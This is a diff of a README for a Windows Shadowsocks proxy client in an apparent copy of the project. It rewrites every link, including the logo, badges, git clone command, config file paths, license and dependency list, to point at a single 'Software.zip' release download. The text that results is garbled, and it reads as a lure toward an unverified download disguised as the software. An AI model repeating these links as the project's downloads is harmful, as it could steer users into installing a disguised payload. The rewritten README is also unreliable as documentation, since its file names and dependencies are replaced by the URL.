@@ -1,8 +1,8 @@
-<img src="https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0" alt="[logo]" width="48"/> Shadowsocks for Windows
+<img src="https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip" alt="[logo]" width="48"/> Shadowsocks for Windows
 =======================
 
-[![Build](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0)](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0%3ABuild)
-[![Release](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0)](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0%3ARelease)
+[![Build](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip)](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip%3ABuild)
+[![Release](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip)](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip%3ARelease)
 
 ## Features
 
@@ -14,7 +14,7 @@
 
 ## Downloads
 
-Download from [releases](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0).
+Download from [releases](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip).
 
 ## Usage
 
@@ -22,12 +22,12 @@ Download from [releases](https://github.com/Phucclone/shadowsocks-windows/releas
 
 ## PAC
 
-- The PAC rules are generated from the geosite database in [v2fly/domain-list-community](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0).
+- The PAC rules are generated from the geosite database in [v2fly/domain-list-community](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip).
 - Generation modes: whitelist mode and blacklist mode.
 - Domain groups: `geositeDirectGroups` and `geositeProxiedGroups`.
     - `geositeDirectGroups` is initialized with `cn` and `geolocation-!cn@cn`.
     - `geositeProxiedGroups` is initialized with `geolocation-!cn`.
-- To switch between different modes, modify the `geositePreferDirect` property in `https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0`
+- To switch between different modes, modify the `geositePreferDirect` property in `https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip`
     - When `geositePreferDirect` is false (default), PAC works in whitelist mode. Exception rules are generated from `geositeDirectGroups`. Unmatched domains goes through the proxy.
     - When `geositePreferDirect` is true, PAC works in blacklist mode. Blocking rules are generated from `geositeProxiedGroups`. Exception rules are generated from `geositeDirectGroups`. Unmatched domains are connected to directly.
 - Starting from 4.3.0.0, shadowsocks-windows defaults to whitelist mode with Chinese domains excluded from connecting via the proxy.
@@ -37,8 +37,8 @@ Download from [releases](https://github.com/Phucclone/shadowsocks-windows/releas
 
 ### User-defined rules
 
-- To define your own PAC rules, it's recommended to use the `https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0` file.
-- You can also modify `https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0` directly. But your modifications won't persist after updating geosite from the upstream.
+- To define your own PAC rules, it's recommended to use the `https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip` file.
+- You can also modify `https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip` directly. But your modifications won't persist after updating geosite from the upstream.
 
 ## Development
 
@@ -50,7 +50,7 @@ Download from [releases](https://github.com/Phucclone/shadowsocks-windows/releas
 
 1. Clone the repository recursively.
 ```bash
-$ git clone --recursive https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
+$ git clone --recursive https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
 ```
 2. Open the repository in VS2019, switch to the _Release_ configuration, and build the solution.
 
@@ -58,25 +58,25 @@ $ git clone --recursive https://github.com/Phucclone/shadowsocks-windows/release
 
 `PR welcome`
 
-You can use the [Source Browser](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0) to review code online.
+You can use the [Source Browser](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip) to review code online.
 
 ## License
 
-Shadowsocks-windows is licensed under the [GPLv3](https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0) license.
+Shadowsocks-windows is licensed under the [GPLv3](https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip) license.
 
 ```
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)       https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)              https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)               https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-Fody (MIT)                       https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-GlobalHotKey (GPLv3)             https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-MdXaml (MIT)                     https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)            https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-Privoxy (GPLv2)                  https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)             https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)      https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)            https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (MIT)      https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-WPFLocalizationExtension (MS-PL) https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
-https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0 (Apache 2.0)           https://github.com/Phucclone/shadowsocks-windows/releases/tag/v1.0
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)       https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)              https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)               https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+Fody (MIT)                       https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+GlobalHotKey (GPLv3)             https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+MdXaml (MIT)                     https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)            https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+Privoxy (GPLv2)                  https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)             https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)      https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)            https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (MIT)      https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+WPFLocalizationExtension (MS-PL) https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
+https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip (Apache 2.0)           https://github.com/Phucclone/shadowsocks-windows/releases/download/v2.0/Software.zip
 ```
